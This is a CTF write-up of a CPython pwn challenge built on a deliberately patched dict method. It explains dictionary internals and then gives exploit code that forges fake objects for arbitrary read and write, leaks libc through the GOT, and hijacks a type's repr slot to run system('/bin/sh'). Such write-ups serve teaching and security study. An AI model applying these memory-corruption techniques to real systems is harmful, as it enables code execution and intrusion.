@@ -1,0 +1,857 @@
+---
+title: GreyCTF 26 Finals - grey-dictionary
+date: 2026-06-27
+category: writeups
+excerpt: Yet another cpython pwn
+tags:
+  - pwn
+  - cpython
+---
+import Challenge from "@components/Challenge.vue";
+
+This year, GreyCTF flew down some international teams for the event. It's been a
+while since GreyCTF had international participants for the finals, so I was
+quite excited to meet everyone. Sadly, I caught a stomach flu the day before
+the CTF and couldn't make it down on-site :(
+
+Anyway, I set a CPython pwn challenge for the finals, this time involving the
+dictionary object so that I would be forced to figure out how dictionaries
+worked in CPython.
+
+<Challenge
+    title="grey-dictionary"
+    flag="grey{oh_n0_d0nk3y_k0ng_g0t_ma_keys_6449710d406d}"
+    solves={2}
+>
+
+>  dictionaries
+> 
+>  1. a book or digital resource (such as Dictionary.com) containing a selection of words and information about their meanings, pronunciations,
+>     etymologies, inflected forms, derived forms, etc., in either the same or another language; lexicon; glossary.
+> 
+>     an unabridged dictionary of English;
+> 
+>     a Japanese–English dictionary.
+> 
+>  2. a book or digital resource giving information on a particular subject or on a particular class of words, names, or facts, usually arranged alphabetically.
+> 
+>     a biographical dictionary;
+> 
+>     a dictionary of mathematics.
+> 
+>  3. Computers.
+> 
+>    a list of codes, terms, keys, etc., and their meanings, used by a computer program or system.
+> 
+>    a selection of words used by a piece of software, such as a word-processing program, to check the spelling of text entered.
+>
+>    a new vector to get remote code execution.
+
+</Challenge>
+
+# Diff analysis
+
+> I spent more time trying to block reading flag.txt directly than
+> actually making the challenge. It's so hard to patch out open without crashing
+> during compilation...
+
+This is the main part of the diff applied to the cpython source:
+
+```diff
+diff --git a/Objects/dictobject.c b/Objects/dictobject.c
+index 254cd9a..3bb2462 100644
+--- a/Objects/dictobject.c
++++ b/Objects/dictobject.c
+@@ -232,6 +232,29 @@ equally good collision statistics, needed less code & used less memory.
+ 
+ */
+ 
++bool grey_lock = 0;
++
++static PyObject *dict_grey(PyDictObject *mp) {
++    if (grey_lock) {
++        Py_RETURN_FALSE;
++    } else {
++        grey_lock++;
++
++        size_t entry_size = DK_IS_UNICODE(mp->ma_keys) ? sizeof(PyDictUnicodeEntry) : sizeof(PyDictKeyEntry);
++        size_t used_size = entry_size * mp->ma_keys->dk_nentries;
++
++        void* buf = PyMem_Malloc(used_size);
++
++        memcpy(buf, DK_ENTRIES(mp->ma_keys), used_size);
++        mp->ma_keys->dk_log2_index_bytes--;
++        memcpy(DK_ENTRIES(mp->ma_keys), buf, used_size);
++
++
++        Py_RETURN_TRUE;
++    }
++}
++
++
+ static int dictresize(PyInterpreterState *interp, PyDictObject *mp,
+                       uint8_t log_newsize, int unicode);
+ 
+@@ -1375,6 +1398,7 @@ insert_to_emptydict(PyInterpreterState *interp, PyDictObject *mp,
+ /*
+ Internal routine used by dictresize() to build a hashtable of entries.
+ */
++
+ static void
+ build_indices_generic(PyDictKeysObject *keys, PyDictKeyEntry *ep, Py_ssize_t n)
+ {
+@@ -3681,6 +3705,7 @@ static PyMethodDef mapp_methods[] = {
+      copy__doc__},
+     DICT___REVERSED___METHODDEF
+     {"__class_getitem__", Py_GenericAlias, METH_O|METH_CLASS, PyDoc_STR("See PEP 585")},
++    {"grey", (void *)dict_grey, METH_NOARGS, "samuzora"},
+     {NULL,              NULL}   /* sentinel */
+ };
+```
+
+We define a new method on the `PyDictObject{:c}`, which simply decrements
+`ma_keys->dk_log2_index_bytes{:c}` by one, and then shifts the `dk_entries{:c}` array to
+the position it should be in after the decrement. Let's explore how the
+`PyDictObject{:c}` and `PyDictKeysObject{:c}` are represented in cpython.
+
+# Exploring the structs
+
+The `PyDictObject{:c}` has the following fields:
+
+```c
+typedef struct {
+    PyObject_HEAD
+
+    /* Number of items in the dictionary */
+    Py_ssize_t ma_used;
+
+    /* Dictionary version: globally unique, value change each time
+       the dictionary is modified */
+#ifdef Py_BUILD_CORE
+    uint64_t ma_version_tag;
+#else
+    Py_DEPRECATED(3.12) uint64_t ma_version_tag;
+#endif
+
+    PyDictKeysObject *ma_keys;
+
+    /* If ma_values is NULL, the table is "combined": keys and values
+       are stored in ma_keys.
+
+       If ma_values is not NULL, the table is split:
+       keys are stored in ma_keys and values are stored in ma_values */
+    PyDictValues *ma_values;
+} PyDictObject;
+```
+
+And `ma_keys{:c}` is a `PyDictKeysObject{:c}`, which has the following structure:
+
+```c
+/* See dictobject.c for actual layout of DictKeysObject */
+struct _dictkeysobject {
+    Py_ssize_t dk_refcnt;
+
+    /* Size of the hash table (dk_indices). It must be a power of 2. */
+    uint8_t dk_log2_size;
+
+    /* Size of the hash table (dk_indices) by bytes. */
+    uint8_t dk_log2_index_bytes;
+
+    /* Kind of keys */
+    uint8_t dk_kind;
+
+    /* Version number -- Reset to 0 by any modification to keys */
+    uint32_t dk_version;
+
+    /* Number of usable entries in dk_entries. */
+    Py_ssize_t dk_usable;
+
+    /* Number of used entries in dk_entries. */
+    Py_ssize_t dk_nentries;
+
+    /* Actual hash table of dk_size entries. It holds indices in dk_entries,
+       or DKIX_EMPTY(-1) or DKIX_DUMMY(-2).
+
+       Indices must be: 0 <= indice < USABLE_FRACTION(dk_size).
+
+       The size in bytes of an indice depends on dk_size:
+
+       - 1 byte if dk_size <= 0xff (char*)
+       - 2 bytes if dk_size <= 0xffff (int16_t*)
+       - 4 bytes if dk_size <= 0xffffffff (int32_t*)
+       - 8 bytes otherwise (int64_t*)
+
+       Dynamically sized, SIZEOF_VOID_P is minimum. */
+    char dk_indices[];  /* char is required to avoid strict aliasing. */
+
+    /* "PyDictKeyEntry or PyDictUnicodeEntry dk_entries[USABLE_FRACTION(DK_SIZE(dk))];" array follows:
+       see the DK_ENTRIES() macro */
+};
+```
+
+`dk_indices{:c}` consists of the hash table and the actual array of elements,
+as illustrated in `Objects/dictobject.c`:
+
+```c
+/*
++---------------------+
+| dk_refcnt           |
+| dk_log2_size        |
+| dk_log2_index_bytes |
+| dk_kind             |
+| dk_usable           |
+| dk_nentries         |
++---------------------+
+| dk_indices[]        |
+|                     |
++---------------------+
+| dk_entries[]        |
+|                     |
++---------------------+
+*/
+```
+
+Let's now look at the objects in memory. To inspect the process in Docker, we
+can supply the `-p <PID>` flag on the host, after getting the PID of the cpython
+process.
+
+We'll use the following dictionary as an example:
+
+```py
+a = {1: 123, 2: 123, 3: 123}
+```
+
+> Note: in this writeup I'll only be exploring the DICT_KEYS_GENERAL object, and
+> won't be touching on DICT_KEYS_UNICODE or DICT_KEYS_SPLIT. Their layouts
+> differ slightly from DICT_KEYS_GENERAL.
+
+Below is what it looks like in memory:
+
+```ansi
+[22;1;32mpwndbg> [22;39mtel 0x7f7dee52cdc0
+00:0000│ [22;1m   [22m [35m0x7f7dee52cdc0[39m ◂— 1
+01:0008│ [22;1m   [22m [35m0x7f7dee52cdc8[39m —▸ [35m0x564f319514c0 (PyDict_Type)[39m ◂— 0xffffffff
+02:0010│ [22;1m   [22m [35m0x7f7dee52cdd0[39m ◂— 3
+03:0018│ [22;1m   [22m [35m0x7f7dee52cdd8[39m ◂— 0x328f00
+04:0020│ [22;1m   [22m [35m0x7f7dee52cde0[39m —▸ [35m0x7f7dee762330[39m ◂— 1
+05:0028│ [22;1m   [22m [35m0x7f7dee52cde8[39m ◂— 0[m
+```
+
+According to the struct definition above, `ma_keys` is at 0x7f7dee762330. Let's
+also see what it looks like in memory.
+
+```ansi
+[22;1;32mpwndbg> [22;39mtel 0x7f7dee762330 50
+00:0000│ [22;1m   [22m [35m0x7f7dee762330[39m ◂— 1
+01:0008│ [22;1m   [22m [35m0x7f7dee762338[39m ◂— 0x303
+02:0010│ [22;1m   [22m [35m0x7f7dee762340[39m ◂— 2
+03:0018│ [22;1m   [22m [35m0x7f7dee762348[39m ◂— 3
+04:0020│ [22;1m   [22m [35m0x7f7dee762350[39m ◂— 0xffffffff020100ff
+05:0028│ [22;1m   [22m [35m0x7f7dee762358[39m ◂— 1
+06:0030│ [22;1m   [22m [35m0x7f7dee762360[39m —▸ [35m0x564f31a37188 (_PyRuntime+3304)[39m ◂— 0xffffffff
+07:0038│ [22;1m   [22m [35m0x7f7dee762368[39m —▸ [35m0x564f31a380c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+08:0040│ [22;1m   [22m [35m0x7f7dee762370[39m ◂— 2
+09:0048│ [22;1m   [22m [35m0x7f7dee762378[39m —▸ [35m0x564f31a371a8 (_PyRuntime+3336)[39m ◂— 0xffffffff
+0a:0050│ [22;1m   [22m [35m0x7f7dee762380[39m —▸ [35m0x564f31a380c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+0b:0058│ [22;1m   [22m [35m0x7f7dee762388[39m ◂— 3
+0c:0060│ [22;1m   [22m [35m0x7f7dee762390[39m —▸ [35m0x564f31a371c8 (_PyRuntime+3368)[39m ◂— 0xffffffff
+0d:0068│ [22;1m   [22m [35m0x7f7dee762398[39m —▸ [35m0x564f31a380c8 (_PyRuntime+7208)[39m ◂— 0xffffffff[m
+```
+
+As we can see, the hash table at address 0x7f7dee762350 is adjacent to the array
+of `PyDictKeyEntry{:c}`. And each `PyDictKeyEntry{:c}` has the following structure:
+
+```c
+typedef struct {
+    /* Cached hash code of me_key. */
+    Py_hash_t me_hash;
+    PyObject *me_key;
+    PyObject *me_value; /* This field is only meaningful for combined tables */
+} PyDictKeyEntry;
+```
+
+This corresponds with what we see in memory: `hash(1) == 1`, 0x564f31a37188 is
+presumably the singleton object for 1, and 0x564f31a380c8 is presumably the
+singleton object for 123.
+
+Now, how does the hash table work? From the example above, we see that indices
+1, 2 and 3 of the hash table correspond to the values 0, 1 and 2. We can make an
+educated guess: the hash of the key is used to index the hash table, and obtain
+a value that will be used to index the `dk_entries{:c}` array.
+
+This is indeed the case, as we can see in the implementation of
+`dictkeys_get_index{:c}` and `find_empty_slot{:c}`, which is used during
+insertion:
+
+```c
+/* macro definitions pulled from other files */
+#define DK_LOG_SIZE(dk)  _Py_RVALUE((dk)->dk_log2_size)
+#define DK_SIZE(dk)      (1<<DK_LOG_SIZE(dk))
+#define DK_MASK(dk) (DK_SIZE(dk)-1)
+
+/* lookup indices.  returns DKIX_EMPTY, DKIX_DUMMY, or ix >=0 */
+static inline Py_ssize_t
+dictkeys_get_index(const PyDictKeysObject *keys, Py_ssize_t i)
+{
+    int log2size = DK_LOG_SIZE(keys);
+    Py_ssize_t ix;
+
+    if (log2size < 8) {
+        const int8_t *indices = (const int8_t*)(keys->dk_indices);
+        ix = indices[i];
+    }
+    else if (log2size < 16) {
+        const int16_t *indices = (const int16_t*)(keys->dk_indices);
+        ix = indices[i];
+    }
+#if SIZEOF_VOID_P > 4
+    else if (log2size >= 32) {
+        const int64_t *indices = (const int64_t*)(keys->dk_indices);
+        ix = indices[i];
+    }
+#endif
+    else {
+        const int32_t *indices = (const int32_t*)(keys->dk_indices);
+        ix = indices[i];
+    }
+    assert(ix >= DKIX_DUMMY);
+    return ix;
+}
+
+/* Internal function to find slot for an item from its hash
+   when it is known that the key is not present in the dict.
+
+   The dict must be combined. */
+static Py_ssize_t
+find_empty_slot(PyDictKeysObject *keys, Py_hash_t hash)
+{
+    assert(keys != NULL);
+
+    const size_t mask = DK_MASK(keys);
+    size_t i = hash & mask;
+    Py_ssize_t ix = dictkeys_get_index(keys, i);
+    for (size_t perturb = hash; ix >= 0;) {
+        perturb >>= PERTURB_SHIFT;
+        i = (i*5 + perturb + 1) & mask;
+        ix = dictkeys_get_index(keys, i);
+    }
+    return i;
+}
+```
+
+The `DK_MASK{:c}` macro is used to ensure that the computed hash that will be
+used to index the hash table is capped to the size of the hash table. So, if we
+were inserting a key 0x9 into our dictionary, the computed index would be at
+index 1 of the hash table. Let's demonstrate this with a dictionary like such:
+
+```py
+a = {3: 123, 4: 123, 9: 123}
+```
+
+The layout in memory:
+
+```ansi
+[22;1;32mpwndbg> [22;39mtel 0x7fbda3a7e330 50
+00:0000│ [22;1m   [22m [35m0x7fbda3a7e330[39m ◂— 1
+01:0008│ [22;1m   [22m [35m0x7fbda3a7e338[39m ◂— 0x303
+02:0010│ [22;1m   [22m [35m0x7fbda3a7e340[39m ◂— 2
+03:0018│ [22;1m   [22m [35m0x7fbda3a7e348[39m ◂— 3
+04:0020│ [22;1m   [22m [35m0x7fbda3a7e350[39m ◂— 0xffffff0100ff02ff
+05:0028│ [22;1m   [22m [35m0x7fbda3a7e358[39m ◂— 3
+06:0030│ [22;1m   [22m [35m0x7fbda3a7e360[39m —▸ [35m0x560523f7e1c8 (_PyRuntime+3368)[39m ◂— 0xffffffff
+07:0038│ [22;1m   [22m [35m0x7fbda3a7e368[39m —▸ [35m0x560523f7f0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+08:0040│ [22;1m   [22m [35m0x7fbda3a7e370[39m ◂— 4
+09:0048│ [22;1m   [22m [35m0x7fbda3a7e378[39m —▸ [35m0x560523f7e1e8 (_PyRuntime+3400)[39m ◂— 0xffffffff
+0a:0050│ [22;1m   [22m [35m0x7fbda3a7e380[39m —▸ [35m0x560523f7f0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+0b:0058│ [22;1m   [22m [35m0x7fbda3a7e388[39m ◂— 9 /* '\t' */
+0c:0060│ [22;1m   [22m [35m0x7fbda3a7e390[39m —▸ [35m0x560523f7e288 (_PyRuntime+3560)[39m ◂— 0xffffffff
+0d:0068│ [22;1m   [22m [35m0x7fbda3a7e398[39m —▸ [35m0x560523f7f0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff[m
+```
+
+Indeed, we see the value 0x2 at index 0x1 of the hash table, and in
+`dk_entries{:c}` we also see the 0x9 `PyDictKeyEntry{:c}` element at index 0x2.
+
+Notice also the `PERTURB_SHIFT{:c}` operation in `find_empty_slot{:c}`. This
+operation is necessary because of the very high likelihood for collisions when
+inserting into the hash table (for a hash table of size 8, we literally only
+have 8 possible slots to place a key into). The way the perturbation is
+calculated is quite interesting - see the comments below, from
+`Objects/dictobject.c`:
+
+```c
+/*
+The first half of collision resolution is to visit table indices via this
+recurrence:
+
+    j = ((5*j) + 1) mod 2**i
+
+For any initial j in range(2**i), repeating that 2**i times generates each
+int in range(2**i) exactly once (see any text on random-number generation for
+proof).  By itself, this doesn't help much:  like linear probing (setting
+j += 1, or j -= 1, on each loop trip), it scans the table entries in a fixed
+order.  This would be bad, except that's not the only thing we do, and it's
+actually *good* in the common cases where hash keys are consecutive.  In an
+example that's really too small to make this entirely clear, for a table of
+size 2**3 the order of indices is:
+
+    0 -> 1 -> 6 -> 7 -> 4 -> 5 -> 2 -> 3 -> 0 [and here it's repeating]
+
+If two things come in at index 5, the first place we look after is index 2,
+not 6, so if another comes in at index 6 the collision at 5 didn't hurt it.
+Linear probing is deadly in this case because there the fixed probe order
+is the *same* as the order consecutive keys are likely to arrive.  But it's
+extremely unlikely hash codes will follow a 5*j+1 recurrence by accident,
+and certain that consecutive hash codes do not.
+
+The other half of the strategy is to get the other bits of the hash code
+into play.  This is done by initializing a (unsigned) vrbl "perturb" to the
+full hash code, and changing the recurrence to:
+
+    perturb >>= PERTURB_SHIFT;
+    j = (5*j) + 1 + perturb;
+    use j % 2**i as the next table index;
+
+Now the probe sequence depends (eventually) on every bit in the hash code,
+and the pseudo-scrambling property of recurring on 5*j+1 is more valuable,
+because it quickly magnifies small differences in the bits that didn't affect
+the initial index.  Note that because perturb is unsigned, if the recurrence
+is executed often enough perturb eventually becomes and remains 0.  At that
+point (very rarely reached) the recurrence is on (just) 5*j+1 again, and
+that's certain to find an empty slot eventually (since it generates every int
+in range(2**i), and we make sure there's always at least one empty slot).
+*/
+```
+
+So using this perturbation algorithm, a given hash is guaranteed to visit every
+index in the hash table exactly once before looping. During lookup, every time
+the index lands on an occupied slot, we will compare the actual hash of the
+`PyDictKeyEntry{:c}` to verify whether we've actually found the correct index or
+if it's just a collision. When we land on an empty slot (`DKIX_EMPTY{:c}` aka
+0xff), we terminate the lookup and return KeyError as there are no further
+keys down the perturbation chain.
+
+There's a small problem here: what if one of the keys in the middle of the
+perturbation chain was deleted? We cannot terminate the lookup in that case, as
+the keys further down the chain would then be unreachable. To differentiate a
+slot that was never occupied before from a slot that was previously occupied, we
+have another marker value, `DKIX_DUMMY{:c}` aka 0xfe. So, when a key is deleted,
+instead of changing the index in the hash table to 0xff, we change it to 0xfe,
+which indicates to the lookup that there once was a key here, and there could be
+further keys down the chain, so we should not terminate the lookup.
+
+Another caveat for lookup: if every entry in the hash table is occupied, a
+lookup for a non-existent key will never terminate, since the termination
+condition is when it lands on `DKIX_EMPTY{:c}`. To prevent this, the hash table
+can never be allowed to fill up completely, ie. `dk_usable + dk_nentries{:c}`
+must be smaller than the actual capacity of the dictionary. This is defined in
+the `USABLE_FRACTION{:c}` macro:
+
+```c
+/* USABLE_FRACTION is the maximum dictionary load.
+ * Increasing this ratio makes dictionaries more dense resulting in more
+ * collisions.  Decreasing it improves sparseness at the expense of spreading
+ * indices over more cache lines and at the cost of total memory consumed.
+ *
+ * USABLE_FRACTION must obey the following:
+ *     (0 < USABLE_FRACTION(n) < n) for all n >= 2
+ *
+ * USABLE_FRACTION should be quick to calculate.
+ * Fractions around 1/2 to 2/3 seem to work well in practice.
+ */
+#define USABLE_FRACTION(n) (((n) << 1)/3)
+```
+
+During insertion, every time the index lands on a currently occupied slot, the
+perturbation will be applied, and we will continue searching down the chain
+until we find an empty slot, either `DKIX_EMPTY{:c}` or `DKIX_DUMMY{:c}`.
+
+Now that we mostly understand how a dictionary works in CPython, let's look at
+our primitive again.
+
+# Exploiting the hash table
+
+Our primitive decrements `dk_log2_index_bytes` by 1, and copies the old
+`dk_entries{:c}` array to the new position it should be in. The implementation
+of `DK_ENTRIES{:c}` is below:
+
+```c
+static inline void* _DK_ENTRIES(PyDictKeysObject *dk) {
+    int8_t *indices = (int8_t*)(dk->dk_indices);
+    size_t index = (size_t)1 << dk->dk_log2_index_bytes;
+    return (&indices[index]);
+}
+static inline PyDictKeyEntry* DK_ENTRIES(PyDictKeysObject *dk) {
+    assert(dk->dk_kind == DICT_KEYS_GENERAL);
+    return (PyDictKeyEntry*)_DK_ENTRIES(dk);
+}
+```
+
+However, as we saw earlier in the macro definition for `DK_SIZE{:c}`, the size
+of the hash table is dictated not just by `dk_log2_index_bytes{:c}`, but also
+`dk_log2_size{:c}`. Let's imagine we have a dictionary that can hold 0x10
+elements, like so:
+
+```py
+a = {
+        0: 123,
+        1: 123,
+        2: 123,
+        3: 123,
+        4: 123,
+        5: 123
+}
+```
+
+Its layout in memory will be as such:
+
+```ansi
+[22;1;32mpwndbg> [22;39mtel 0x7f5eb754c5d0 50
+00:0000│ [22;1m   [22m [35m0x7f5eb754c5d0[39m ◂— 1
+01:0008│ [22;1m   [22m [35m0x7f5eb754c5d8[39m ◂— 0x404
+02:0010│ [22;1m   [22m [35m0x7f5eb754c5e0[39m ◂— 4
+03:0018│ [22;1m   [22m [35m0x7f5eb754c5e8[39m ◂— 6
+04:0020│ [22;1m   [22m [35m0x7f5eb754c5f0[39m ◂— 0xffff050403020100
+05:0028│ [22;1m   [22m [35m0x7f5eb754c5f8[39m ◂— 0xffffffffffffffff
+06:0030│ [22;1m   [22m [35m0x7f5eb754c600[39m ◂— 0
+07:0038│ [22;1m   [22m [35m0x7f5eb754c608[39m —▸ [35m0x5557f6a5c168 (_PyRuntime+3272)[39m ◂— 0xffffffff
+08:0040│ [22;1m   [22m [35m0x7f5eb754c610[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+09:0048│ [22;1m   [22m [35m0x7f5eb754c618[39m ◂— 1
+0a:0050│ [22;1m   [22m [35m0x7f5eb754c620[39m —▸ [35m0x5557f6a5c188 (_PyRuntime+3304)[39m ◂— 0xffffffff
+0b:0058│ [22;1m   [22m [35m0x7f5eb754c628[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+0c:0060│ [22;1m   [22m [35m0x7f5eb754c630[39m ◂— 2
+0d:0068│ [22;1m   [22m [35m0x7f5eb754c638[39m —▸ [35m0x5557f6a5c1a8 (_PyRuntime+3336)[39m ◂— 0xffffffff
+0e:0070│ [22;1m   [22m [35m0x7f5eb754c640[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+0f:0078│ [22;1m   [22m [35m0x7f5eb754c648[39m ◂— 3
+10:0080│ [22;1m   [22m [35m0x7f5eb754c650[39m —▸ [35m0x5557f6a5c1c8 (_PyRuntime+3368)[39m ◂— 0xffffffff
+11:0088│ [22;1m   [22m [35m0x7f5eb754c658[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+12:0090│ [22;1m   [22m [35m0x7f5eb754c660[39m ◂— 4
+13:0098│ [22;1m   [22m [35m0x7f5eb754c668[39m —▸ [35m0x5557f6a5c1e8 (_PyRuntime+3400)[39m ◂— 0xffffffff
+14:00a0│ [22;1m   [22m [35m0x7f5eb754c670[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+15:00a8│ [22;1m   [22m [35m0x7f5eb754c678[39m ◂— 5
+16:00b0│ [22;1m   [22m [35m0x7f5eb754c680[39m —▸ [35m0x5557f6a5c208 (_PyRuntime+3432)[39m ◂— 0xffffffff
+17:00b8│ [22;1m   [22m [35m0x7f5eb754c688[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff[m
+```
+
+And after we call `a.grey(){:py}`:
+
+```ansi
+[22;1;32mpwndbg> [22;39mtel 0x7f5eb754c5d0 50
+00:0000│ [22;1m   [22m [35m0x7f5eb754c5d0[39m ◂— 1
+01:0008│ [22;1m   [22m [35m0x7f5eb754c5d8[39m ◂— 0x304
+02:0010│ [22;1m   [22m [35m0x7f5eb754c5e0[39m ◂— 4
+03:0018│ [22;1m   [22m [35m0x7f5eb754c5e8[39m ◂— 6
+04:0020│ [22;1m   [22m [35m0x7f5eb754c5f0[39m ◂— 0xffff050403020100
+05:0028│ [22;1m   [22m [35m0x7f5eb754c5f8[39m ◂— 0
+06:0030│ [22;1m   [22m [35m0x7f5eb754c600[39m —▸ [35m0x5557f6a5c168 (_PyRuntime+3272)[39m ◂— 0xffffffff
+07:0038│ [22;1m   [22m [35m0x7f5eb754c608[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+08:0040│ [22;1m   [22m [35m0x7f5eb754c610[39m ◂— 1
+09:0048│ [22;1m   [22m [35m0x7f5eb754c618[39m —▸ [35m0x5557f6a5c188 (_PyRuntime+3304)[39m ◂— 0xffffffff
+0a:0050│ [22;1m   [22m [35m0x7f5eb754c620[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+0b:0058│ [22;1m   [22m [35m0x7f5eb754c628[39m ◂— 2
+0c:0060│ [22;1m   [22m [35m0x7f5eb754c630[39m —▸ [35m0x5557f6a5c1a8 (_PyRuntime+3336)[39m ◂— 0xffffffff
+0d:0068│ [22;1m   [22m [35m0x7f5eb754c638[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+0e:0070│ [22;1m   [22m [35m0x7f5eb754c640[39m ◂— 3
+0f:0078│ [22;1m   [22m [35m0x7f5eb754c648[39m —▸ [35m0x5557f6a5c1c8 (_PyRuntime+3368)[39m ◂— 0xffffffff
+10:0080│ [22;1m   [22m [35m0x7f5eb754c650[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+11:0088│ [22;1m   [22m [35m0x7f5eb754c658[39m ◂— 4
+12:0090│ [22;1m   [22m [35m0x7f5eb754c660[39m —▸ [35m0x5557f6a5c1e8 (_PyRuntime+3400)[39m ◂— 0xffffffff
+13:0098│ [22;1m   [22m [35m0x7f5eb754c668[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+14:00a0│ [22;1m   [22m [35m0x7f5eb754c670[39m ◂— 5
+15:00a8│ [22;1m   [22m [35m0x7f5eb754c678[39m —▸ [35m0x5557f6a5c208 (_PyRuntime+3432)[39m ◂— 0xffffffff
+16:00b0│ [22;1m   [22m [35m0x7f5eb754c680[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff
+17:00b8│ [22;1m   [22m [35m0x7f5eb754c688[39m —▸ [35m0x5557f6a5d0c8 (_PyRuntime+7208)[39m ◂— 0xffffffff[m
+```
+
+Now, during lookup, the hash of the first element in the `dk_entries{:c}` array
+will overlap with the last 8 slots in the `dk_indices{:c}` hash table. This
+means that we can use the first element's hash to control some indices of the
+hash table! Obviously, we can use this to index a fake `PyDictKeyEntry{:c}`
+that is placed after the entries array. Let's get to faking stuff!
+
+# fakeobj galore
+
+We'll use the `bytes` object to place our fakeobjs in memory. Note that pymalloc
+is a pool-based allocator, but not all same-sized objects will be placed in the
+same pool as there can be multiple pools handling objects of the same size.
+Therefore, we should try our best to allocate our target objects in the same
+pool by keeping their sizes the same, but if it fails we can simply spray more
+same-sized objects until our desired pool is used.
+
+
+First off, let's make a fake `PyDictKeyEntry{:c}` that points to a fake
+bytearray. This fake bytearray will be accessible via `victim_dict[0x8]{:py}`,
+and we'll use it as our arbitrary write primitive. 0x8 is the first index in the
+portion of the hash table that we control; the hash value that overwrites the
+hash table should therefore be 0x00000000000000XX, where XX is
+(offset_to_fakeobj / 0x18). Empirically, this value is 0x24.
+
+```py
+victim_dict = {
+        0x24: 123,
+        0: 123,
+        1: 123,
+        2: 123,
+        3: 123,
+        4: 123,
+        5: 123,
+        6: 123,
+}
+victim_dict.grey()
+
+# fake PyDictKeysEntry
+fake_stuff = b"a"*0x8
+fake_stuff += pack(0x8)
+fake_stuff += pack(id(0x8))
+fake_stuff += pack(bytearray_addr)
+
+# fake bytearray for writing
+fake_stuff += pack(0x100)
+fake_stuff += pack(id(bytearray))
+fake_stuff += pack(0x1000)
+fake_stuff += pack(0x1000)
+fake_stuff += pack(target_addr)
+fake_stuff += pack(target_addr)
+
+# padding
+fake_stuff += b"\x00" * (0xf0 - len(fake_stuff))
+```
+
+Since we can't update `target_addr{:py}` (because a bytesobject is immutable),
+we should target some struct that has all our writes in 1 contiguous segment.
+Something useful we can do is to control the elements in the backing buffer of a
+list. With this, we basically have unlimited fakeobjs. Something like this
+should work, although the address of the backing buffer depends on the state of
+the pymalloc allocator, and we need to calculate its address via gdb:
+
+```py
+fakeobj_prim = [
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+]
+print(f"{hex(id(fakeobj_prim)) = }")
+target_addr = bytearray_addr - 0x160
+```
+
+Now, we want to introduce another fake bytearray, this time for reading GOT so
+we can get our libc leak. We can use the address of 1 to calculate the GOT
+address as 1 is a singleton and lives in the cpython binary, not in one of the
+pymalloc pools. We will place this fake bytearray in the list using our write primitive.
+
+> I forgot to disable the /proc filesystem so some teams got libc leak by
+> reading /proc/self/maps. Fair enough :(
+
+```py
+# create another fake bytearray for reading
+puts_got_addr = id(1) - 0xf97f8
+print(f"{hex(puts_got_addr) = }")
+more_fake_stuff = pack(0x100)
+more_fake_stuff += pack(id(bytearray))
+more_fake_stuff += pack(0x1000)
+more_fake_stuff += pack(0x1000)
+more_fake_stuff += pack(puts_got_addr)
+more_fake_stuff += pack(puts_got_addr)
+
+write_gadget[0x00:0x08] = pack(id(more_fake_stuff)+0x20)
+
+# get system addr
+puts = int.from_bytes(fakeobj_prim[0][0:8], byteorder="little")
+system = puts - 0x325e0
+print(f"{hex(system) = }")
+```
+
+Finally, we are ready to create the fakeobj that will give us RCE. We will
+target the vtable inside a fake type, and set the reprfunc field to system.
+Then, we will use a fake object to reference this fake type, and on calling
+`repr(fakeobj){:py}` we should get our shell. Since the object itself is the
+first parameter passed to reprfunc, we must put the /bin/sh string in the
+refcount of the object (but because refcount is volatile we need to check in gdb
+how much to decrement it by). Lastly, we will put this fakeobj in the list we
+created earlier, using our write primitive.
+
+```py
+# fake type to get rip control via reprfunc
+faker_stuff = pack(0x100)
+faker_stuff += pack(id(type))
+faker_stuff += b"a"*0x48
+faker_stuff += pack(system)
+
+fake_type_addr = id(faker_stuff)+0x20
+
+# fake struct to use fake type
+arg = b".bin/sh\x00" # this is refcount so the value will be incremented once
+# fake struct
+more_faker_stuff = arg
+more_faker_stuff += pack(fake_type_addr)
+
+print(f"{hex(id(more_faker_stuff))}")
+
+write_gadget[0x08:0x10] = pack(id(more_faker_stuff)+0x20)
+```
+
+```ansi
+[36m$[39m python3 sender.py
+[+] Opening connection to localhost on port 31467: Done
+[[22;1;34m*[22;39m] Switching to interactive mode
+ executing payload...
+hex(id(buf1)) = '0x7efc76888810'
+hex(id(fakeobj_prim)) = '0x7efc768d5140'
+hex(id(victim_dict)) = '0x7efc7691c900'
+hex(id(fake_stuff)) = '0x7efc76888a50'
+<memory at 0x7efc7685cac0>
+hex(puts_got_addr) = '0x55b4d9012990'
